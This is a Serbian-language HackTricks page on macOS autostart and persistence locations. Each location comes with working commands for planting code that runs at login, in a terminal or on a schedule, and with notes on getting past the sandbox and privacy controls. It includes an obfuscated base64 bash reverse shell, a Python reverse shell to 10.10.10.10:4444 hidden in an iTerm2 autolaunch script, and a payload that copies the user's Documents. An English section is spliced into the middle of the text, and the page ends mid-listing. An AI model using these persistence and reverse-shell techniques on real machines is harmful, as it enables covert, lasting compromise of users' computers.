# macOS Automatsko Pokretanje

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ova sekcija se temelji na blog seriji [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), cilj je dodati **više lokacija za automatsko pokretanje** (ako je moguće), ukazati na **koje tehnike još uvek funkcionišu** sa najnovijom verzijom macOS-a (13.4) i specificirati **potrebne dozvole**.

## Bypassovanje Sandbox-a

{% hint style="success" %}
Ovde možete pronaći lokacije za automatsko pokretanje koje su korisne za **bypassovanje sandbox-a** i omogućavaju vam da jednostavno izvršite nešto tako što ćete to **upisati u fajl** i **sačekati** na vrlo **uobičajenu** **akciju**, određeno **vreme** ili **akciju koju obično možete izvršiti** iz sandbox-a bez potrebe za root dozvolama.
{% endhint %}

### Launchd

* Korisno za bypassovanje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

* **`/Library/LaunchAgents`**
* **Okidač**: Ponovno pokretanje
* Potrebne su root dozvole
* **`/Library/LaunchDaemons`**
* **Okidač**: Ponovno pokretanje
* Potrebne su root dozvole
* **`/System/Library/LaunchAgents`**
* **Okidač**: Ponovno pokretanje
* Potrebne su root dozvole
* **`/System/Library/LaunchDaemons`**
* **Okidač**: Ponovno pokretanje
* Potrebne su root dozvole
* **`~/Library/LaunchAgents`**
* **Okidač**: Ponovno prijavljivanje
* **`~/Library/LaunchDemons`**
* **Okidač**: Ponovno prijavljivanje

#### Opis & Eksploatacija

**`launchd`** je **prvi** **proces** koji se izvršava od strane OX S kernela pri pokretanju i poslednji koji se završava pri gašenju. Uvek bi trebao imati **PID 1**. Ovaj proces će **čitati i izvršavati** konfiguracije naznačene u **ASEP** **plistovima** u:

* `/Library/LaunchAgents`: Agensi instalirani od strane administratora za svakog korisnika
* `/Library/LaunchDaemons`: Sistemski daemoni instalirani od strane administratora
* `/System/Library/LaunchAgents`: Agensi za svakog korisnika koje obezbeđuje Apple.
* `/System/Library/LaunchDaemons`: Sistemski daemoni koje obezbeđuje Apple.

Kada se korisnik prijavi, plistovi smešteni u `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` se pokreću sa **dozvolama prijavljenog korisnika**.

**Glavna razlika između agenata i demona je ta što se agenti učitavaju prilikom prijavljivanja korisnika, dok se demoni učitavaju prilikom pokretanja sistema** (kao što postoje servisi poput ssh koji treba da se izvrše pre nego što bilo koji korisnik pristupi sistemu). Takođe, agenti mogu koristiti GUI dok demoni moraju raditi u pozadini.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Postoje slučajevi kada je **agent potrebno izvršiti pre prijave korisnika**, a to se naziva **PreLoginAgents**. Na primer, ovo je korisno za pružanje pomoćne tehnologije pri prijavi. Mogu se pronaći i u `/Library/LaunchAgents` (vidi [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) primer).

{% hint style="info" %}
Konfiguracione datoteke za nove demone ili agente će biti **učitane nakon sledećeg restarta ili korišćenjem** `launchctl load <target.plist>` Takođe je **moguće učitati .plist datoteke bez te ekstenzije** pomoću `launchctl -F <file>` (međutim, ove plist datoteke se neće automatski učitati nakon restarta).\
Takođe je moguće **isključiti** ih pomoću `launchctl unload <target.plist>` (proces koji se odnosi na njih će biti završen).

Da biste **osigurali** da nema **ničega** (kao što je prebrisavanje) što **sprečava** **Agent** ili **Demon** da **se pokrene**, pokrenite: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Izlistajte sve agente i demone učitane od strane trenutnog korisnika:
```bash
launchctl list
```
{% hint style="warning" %}
Ako je plist u vlasništvu korisnika, čak i ako se nalazi u sistemskim fasciklama za demone, **zadatak će se izvršiti kao korisnik**, a ne kao root. Ovo može sprečiti neke napade na privilegije.
{% endhint %}

### Datoteke za pokretanje ljuske

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Objašnjenje (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
* Ali morate pronaći aplikaciju sa zaobilaženjem TCC-a koja izvršava ljusku koja učitava ove datoteke

#### Lokacije

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Okidač**: Otvorite terminal sa zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Okidač**: Otvorite terminal sa zsh
* Potreban je root
* **`~/.zlogout`**
* **Okidač**: Zatvorite terminal sa zsh
* **`/etc/zlogout`**
* **Okidač**: Zatvorite terminal sa zsh
* Potreban je root
* Potencijalno više u: **`man zsh`**
* **`~/.bashrc`**
* **Okidač**: Otvorite terminal sa bash
* `/etc/profile` (nije uspelo)
* `~/.profile` (nije uspelo)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Okidač**: Očekuje se da se pokrene sa xtermom, ali **nije instaliran** i čak i nakon instalacije javlja se ova greška: xterm: `DISPLAY is not set`

#### Opis i iskorišćavanje

Prilikom pokretanja okruženja ljuske kao što su `zsh` ili `bash`, **određene datoteke za pokretanje se izvršavaju**. macOS trenutno koristi `/bin/zsh` kao podrazumevanu ljusku. Ova ljuska se automatski pristupa kada se pokrene aplikacija Terminal ili kada se pristupi uređaju putem SSH-a. Iako su `bash` i `sh` takođe prisutni u macOS-u, moraju se eksplicitno pozvati da bi se koristili.

Stranica sa opisom zsh-a, koju možemo pročitati sa **`man zsh`**, ima dugačak opis datoteka za pokretanje.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponovno otvorene aplikacije

{% hint style="danger" %}
Konfigurisanje navedenog iskorišćavanja i odjavljivanje i ponovno prijavljivanje ili čak ponovno pokretanje nije uspelo da izvrši aplikaciju. (Aplikacija se nije izvršavala, možda je potrebno da bude pokrenuta kada se ove radnje izvrše)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Okidač**: Ponovno pokretanje aplikacija

#### Opis i iskorišćavanje

Sve aplikacije koje će biti ponovno otvorene nalaze se unutar plist datoteke `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Da biste omogućili da se vaša aplikacija pokrene prilikom ponovnog otvaranja aplikacija, samo trebate **dodati svoju aplikaciju na listu**.

UUID se može pronaći listanjem tog direktorijuma ili pomoću komande `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da biste proverili koje će se aplikacije ponovno otvoriti, možete uraditi:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Da biste **dodali aplikaciju na ovaj popis**, možete koristiti:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Podešavanja Terminala

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
* Terminal koristi FDA dozvole korisnika koji ga koristi

#### Lokacija

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Okidač**: Otvori Terminal

#### Opis i iskorišćavanje

U **`~/Library/Preferences`** se čuvaju podešavanja korisnika u aplikacijama. Neke od ovih podešavanja mogu sadržati konfiguraciju za **izvršavanje drugih aplikacija/skripti**.

Na primer, Terminal može izvršiti komandu pri pokretanju:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija se odražava u datoteci **`~/Library/Preferences/com.apple.Terminal.plist`** ovako:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dakle, ako se plist postavki terminala u sistemu može prepisati, tada se može koristiti funkcionalnost **`open`** da se otvori terminal i izvrši ta komanda.

Možete to dodati sa komandne linije pomoću:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminalski skriptovi / Ostale ekstenzije fajlova

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
* Terminal koristi FDA dozvole korisnika koji ga koristi

#### Lokacija

* **Bilo gde**
* **Okidač**: Otvori Terminal

#### Opis i iskorišćavanje

Ako kreirate [**`.terminal`** skriptu](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i otvorite je, **Terminal aplikacija** će automatski biti pokrenuta kako bi izvršila komande koje su navedene u njoj. Ako Terminal aplikacija ima neke posebne privilegije (kao što su TCC), vaša komanda će biti izvršena sa tim posebnim privilegijama.

Isprobajte sa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Takođe možete koristiti ekstenzije **`.command`**, **`.tool`**, sa redovnim sadržajem shell skripti i one će biti otvorene u Terminalu.

{% hint style="danger" %}
Ako Terminal ima **Pristup celom disku**, biće u mogućnosti da završi tu akciju (napomena da će izvršena komanda biti vidljiva u prozoru Terminala).
{% endhint %}

### Audio dodaci

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Objašnjenje: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
* Možda ćete dobiti dodatni pristup TCC-u

#### Lokacija

* **`/Library/Audio/Plug-Ins/HAL`**
* Potreban je root pristup
* **Okidač**: Ponovno pokretanje coreaudiod ili računara
* **`/Library/Audio/Plug-ins/Components`**
* Potreban je root pristup
* **Okidač**: Ponovno pokretanje coreaudiod ili računara
* **`~/Library/Audio/Plug-ins/Components`**
* **Okidač**: Ponovno pokretanje coreaudiod ili računara
* **`/System/Library/Components`**
* Potreban je root pristup
* **Okidač**: Ponovno pokretanje coreaudiod ili računara

#### Opis

Prema prethodnim objašnjenjima, moguće je **kompajlirati neke audio dodatke** i učitati ih.

### QuickLook dodaci

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
* Možda ćete dobiti dodatni pristup TCC-u

#### Lokacija

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i iskorišćavanje

QuickLook dodaci se mogu izvršiti kada **pokrenete pregled datoteke** (pritisnite razmaknicu sa izabranom datotekom u Finderu) i instaliran je **dodatak koji podržava taj tip datoteke**.

Moguće je kompajlirati sopstveni QuickLook dodatak, smestiti ga na jednoj od prethodnih lokacija da ga učitate, a zatim otvoriti podržanu datoteku i pritisnuti razmaknicu da je pokrenete.

### ~~Login/Logout kuke~~

{% hint style="danger" %}
Ovo nije radilo za mene, ni sa korisničkom LoginHook ni sa root LogoutHook
{% endhint %}

**Objašnjenje**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Morate biti u mogućnosti da izvršite nešto poput `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Nalazi se u `~/Library/Preferences/com.apple.loginwindow.plist`

Oni su zastareli, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ova postavka se čuva u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Da biste ga obrisali:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root korisnik se čuva u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Uslovno zaobilaženje peska

{% hint style="success" %}
Ovde možete pronaći lokacije za pokretanje koje su korisne za **zaobilaženje peska** koje vam omogućava da jednostavno izvršite nešto tako što ćete to **upisati u datoteku** i **očekivati ne baš uobičajene uslove** kao što su specifični **instalirani programi, "neobični" korisnički** postupci ili okruženja.
{% endhint %}

### Cron

**Objašnjenje**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Međutim, morate moći da izvršite `crontab` binarnu datoteku
* Ili biti root
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Potreban je root za direktni pristup pisanju. Root nije potreban ako možete izvršiti `crontab <file>`
* **Okidač**: Zavisi od cron posla

#### Opis i iskorišćavanje

Izlistajte cron poslove **trenutnog korisnika** sa:
```bash
crontab -l
```
Takođe možete videti sve cron poslove korisnika u **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (potrebna je root privilegija).

Na MacOS-u se mogu pronaći nekoliko foldera koji izvršavaju skripte sa **određenom učestalošću** u:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Ovde možete pronaći redovne **cron** **poslove**, **at** **poslove** (koji se retko koriste) i **periodične** **poslove** (uglavnom se koriste za čišćenje privremenih fajlova). Dnevni periodični poslovi se mogu izvršiti na primer sa: `periodic daily`.

Da biste programski dodali **korisnički cron posao**, moguće je koristiti:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 koristi dodeljene TCC dozvole

#### Lokacije

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Okidač**: Otvori iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Okidač**: Otvori iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Okidač**: Otvori iTerm

#### Opis i iskorišćavanje

Skripte smeštene u **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** će biti izvršene. Na primer:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
## macOS Auto Start Locations

macOS provides several locations where applications and processes can be configured to automatically start when the system boots up or when a user logs in. These auto start locations can be leveraged by attackers to maintain persistence on a compromised system.

### Launch Agents

Launch Agents are plist files located in the `~/Library/LaunchAgents` directory or in `/Library/LaunchAgents`. These files define tasks that are executed when a user logs in. Attackers can create or modify these files to execute malicious code during system startup.

### Launch Daemons

Launch Daemons are plist files located in the `/Library/LaunchDaemons` directory. These files define tasks that are executed when the system boots up, before any user logs in. Attackers can create or modify these files to achieve persistence on the compromised system.

### Startup Items

Startup Items are legacy mechanisms that were used in older versions of macOS. They are located in the `/Library/StartupItems` directory or in the `/System/Library/StartupItems` directory. These mechanisms are deprecated and not commonly used anymore.

### Login Items

Login Items are applications or processes that are configured to start when a user logs in. They can be managed through the "Users & Groups" preferences pane in System Preferences. Attackers can add malicious applications or processes to the Login Items list to achieve persistence.

### Cron Jobs

Cron Jobs are scheduled tasks that are executed at specific times or intervals. They can be managed using the `crontab` command or by modifying the `/etc/crontab` file. Attackers can create or modify cron jobs to execute malicious commands or scripts.

### Third-Party Applications

Some third-party applications may have their own mechanisms for auto starting. These mechanisms can vary depending on the application. Attackers can leverage these mechanisms to achieve persistence on a compromised system.

### Conclusion

Understanding the various auto start locations in macOS is crucial for both defenders and attackers. Defenders can use this knowledge to identify and remove malicious auto start entries, while attackers can leverage these locations to maintain persistence on compromised systems. Regularly auditing and monitoring these auto start locations is essential for maintaining a secure macOS environment.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skripta **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** će takođe biti izvršena:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Podešavanja iTerm2 nalaze se u **`~/Library/Preferences/com.googlecode.iterm2.plist`** i mogu **ukazivati na komandu koju treba izvršiti** prilikom otvaranja iTerm2 terminala.

Ovo podešavanje se može konfigurisati u iTerm2 podešavanjima:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

A komanda se odražava u podešavanjima:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Možete postaviti komandu koju želite izvršiti sa:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Visoko je verovatno da postoje **drugi načini za zloupotrebu iTerm2 postavki** kako bi se izvršili proizvoljni komandi.
{% endhint %}

### xbar

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali xbar mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za pristupačnost

#### Lokacija

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Okidač**: Jednom kada se xbar pokrene

#### Opis

Ako je popularni program [**xbar**](https://github.com/matryer/xbar) instaliran, moguće je napisati shell skriptu u **`~/Library/Application\ Support/xbar/plugins/`** koja će se izvršiti kada se xbar pokrene:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali Hammerspoon mora biti instaliran
* Bypass TCC-a: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za pristupačnost

#### Lokacija

* **`~/.hammerspoon/init.lua`**
* **Okidač**: Jednom kada se Hammerspoon pokrene

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA skriptni jezik** za svoje operacije. Značajno podržava integraciju potpunog AppleScript koda i izvršavanje shell skripti, čime značajno poboljšava svoje mogućnosti skriptiranja.

Aplikacija traži jedan fajl, `~/.hammerspoon/init.lua`, i kada se pokrene, izvršiće se skripta.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali ssh mora biti omogućen i korišćen
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* SSH koristi FDA pristup

#### Lokacija

* **`~/.ssh/rc`**
* **Okidač**: Prijavljivanje putem ssh
* **`/etc/ssh/sshrc`**
* Potreban je root pristup
* **Okidač**: Prijavljivanje putem ssh

{% hint style="danger" %}
Da biste uključili ssh, potreban je pristup celom disku:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Opis & Eksploatacija

Podrazumevano, osim ako `PermitUserRC no` nije postavljeno u `/etc/ssh/sshd_config`, kada se korisnik **prijavi putem SSH-a**, skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** će biti izvršene.

### **Stavke prijave**

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali morate izvršiti `osascript` sa argumentima
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Okidač:** Prijavljivanje
* Eksploatacijski payload se čuva pozivanjem **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Okidač:** Prijavljivanje
* Potreban je root

#### Opis

U System Preferences -> Users & Groups -> **Login Items** možete pronaći **stavke koje će se izvršiti prilikom prijavljivanja korisnika**.\
Moguće ih je izlistati, dodavati i uklanjati sa komandne linije:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ove stavke se čuvaju u datoteci **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Stavke za prijavljivanje** se mogu **takođe** naznačiti korišćenjem API-ja [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) koji će čuvati konfiguraciju u **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kao stavka za prijavljivanje

(Pogledajte prethodni odeljak o stavkama za prijavljivanje, ovo je nastavak)

Ako sačuvate **ZIP** datoteku kao **stavku za prijavljivanje**, **`Archive Utility`** će je otvoriti, a ako je zip na primer sačuvan u **`~/Library`** i sadrži fasciklu **`LaunchAgents/file.plist`** sa zadnjim vratima, ta fascikla će biti kreirana (nije podrazumevano) i plist će biti dodat tako da će sledeći put kada se korisnik ponovo prijavi, **zadnja vrata naznačena u plist-u će biti izvršena**.

Druga opcija bi bila da se kreiraju datoteke **`.bash_profile`** i **`.zshenv`** unutar korisničkog HOME direktorijuma, tako da bi ova tehnika i dalje radila ako fascikla LaunchAgents već postoji.

### At

Opis: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali morate **izvršiti** **`at`** i on mora biti **omogućen**
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Morate **izvršiti** **`at`** i on mora biti **omogućen**

#### **Opis**

`at` zadaci su dizajnirani za **planiranje jednokratnih zadataka** koji će se izvršiti u određeno vreme. Za razliku od cron poslova, `at` zadaci se automatski uklanjaju nakon izvršenja. Važno je napomenuti da su ovi zadaci trajni i nakon ponovnog pokretanja sistema, što ih čini potencijalnim sigurnosnim rizicima u određenim uslovima.

Podrazumevano su **onemogućeni**, ali **root** korisnik može da ih **omogući** sa:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Ovo će kreirati fajl za 1 sat:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Proverite red poslova koristeći `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Iznad možemo videti dva zakazana posla. Detalje posla možemo ispisati koristeći `at -c BROJPOSLA`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
